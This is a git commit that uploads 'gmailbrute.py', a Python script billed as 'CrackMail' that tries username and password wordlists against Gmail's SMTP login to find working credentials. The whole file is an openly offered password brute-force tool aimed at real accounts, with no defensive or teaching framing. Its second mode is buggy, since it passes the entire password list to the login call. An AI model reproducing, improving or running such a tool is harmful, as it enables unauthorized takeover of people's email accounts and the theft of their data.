2574daf525b218e72ed55a3a4721b7cb48898745
Tahacker <41658707+Tahacker@users.noreply.github.com>
2018-07-24 21:41:42 -0500

    Add files via upload

---
+++ gmailbrute.py
@@ -0,0 +1,55 @@
+#!/usr/bin/python
+print('''
+	==================================
+	|    CrackMail [Free Version]    |
+	|     Brute Force [Gmail]        |
+	|--------------------------------|
+	| CoDeD By TA Hacker (@391F)     |
+	|--------------------------------|
+
+	''')
+import smtplib
+from os import system
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+do = raw_input('''
+		Choose any number ?
+		1 - Email file
+		2 - target email
+		
+		==>''')
+
+if do == '1':
+    user = raw_input("List Of Usernames => ")
+    passfile = raw_input("List Of Passwords => ")
+    loop_user = open(user, 'r').read().splitlines()
+    loop_passfile = open(passfile, 'r').read().splitlines()
+    for user in loop_user:
+        for passfile in loop_passfile:
+            try:
+                smtpserver.login(user, passfile)
+
+                print("[+] password found :%s" % passfile)
+
+            except smtplib.SMTPAuthenticationError:
+                print("[!] password incorrect :%s" % passfile)
+
+############
+if do == '2':
+    user = raw_input("Enter the target email : ")
+    passfile = raw_input('Enter the password file name : ')
+    passfile = open(passfile, 'r').read().splitlines()
+
+    for password in passfile:
+        try:
+            smtpserver.login(user, passfile)
+
+            print("[+] password found :")
+
+        except smtplib.SMTPAuthenticationError:
+            print("[!] password incorrect :")
+
+
